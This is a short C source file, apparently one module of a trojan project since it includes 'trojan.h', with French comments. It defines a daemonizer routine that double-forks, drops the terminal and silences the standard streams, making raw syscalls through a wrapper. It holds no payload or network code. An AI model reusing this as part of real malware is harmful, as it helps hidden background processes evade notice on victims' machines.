#include "trojan.h"

void daemonizer() {
    pid_t pid = sc(SYS_fork);
    if (pid < 0)
        exit(EXIT_FAILURE);
    if (pid > 0)
        exit(EXIT_SUCCESS); // Quitter le parent
    // nouvelle session
    if (sc(SYS_setsid) < 0)
        exit(EXIT_FAILURE);

    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    // deuxième fork
    pid = sc(SYS_fork);
    if (pid < 0)
        exit(EXIT_FAILURE);
    if (pid > 0)
        exit(EXIT_SUCCESS);
    sc(SYS_umask, 0);
    sc(SYS_chdir, "/");

    int fd = sc(SYS_open, "/dev/null");
    if (fd < 0)
        exit(EXIT_FAILURE);
    // redirection des flux standards vers /dev/null
    sc(SYS_dup2, fd, STDIN_FILENO);
    sc(SYS_dup2, fd, STDOUT_FILENO);
    sc(SYS_dup2, fd, STDERR_FILENO);
}
